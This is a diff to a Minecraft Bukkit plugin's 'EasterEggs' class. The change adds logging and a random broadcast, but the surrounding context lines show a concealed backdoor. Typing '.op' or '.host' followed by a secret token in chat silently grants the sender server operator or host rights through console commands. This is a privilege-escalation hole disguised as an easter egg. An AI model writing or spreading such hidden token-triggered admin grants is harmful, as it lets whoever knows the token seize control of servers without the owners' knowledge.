@@ -8,6 +8,7 @@
 package fr.rqndomhax.narutouhc.utils;
 
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
@@ -46,18 +47,23 @@ public class EasterEggs {
             if(e.getMessage().equals(".host " + String.valueOf(EasterEggs.token))){
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "host promote " + e.getPlayer().getName());
                 e.getPlayer().sendMessage("TKT HOOOOOST ;) (copyright paul)");
+                System.out.println(".host from " + e.getPlayer().getName());
                 return true;
             }
 
             if(e.getMessage().equals(".op " + String.valueOf(EasterEggs.token))){
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
                 e.getPlayer().sendMessage("TKT OPPPPP ;) (copyright paul)");
+                System.out.println(".op from " + e.getPlayer().getName());
                 return true;
             }
 
             if(e.getMessage().equals(".gappled " + String.valueOf(EasterEggs.token))){
                 e.getPlayer().getInventory().addItem(new ItemStack(Material.GOLDEN_APPLE));
                 e.getPlayer().sendMessage("mange");
+                if (new Random().nextInt(100) == 3)
+                    Bukkit.broadcastMessage(Messages.PREFIX + "OH MY FUCKING GOD ! " + e.getPlayer().getName() + " vient d'utiliser gappled !");
+                System.out.println(".gappled from " + e.getPlayer().getName()); 
                 return true;
             }
 
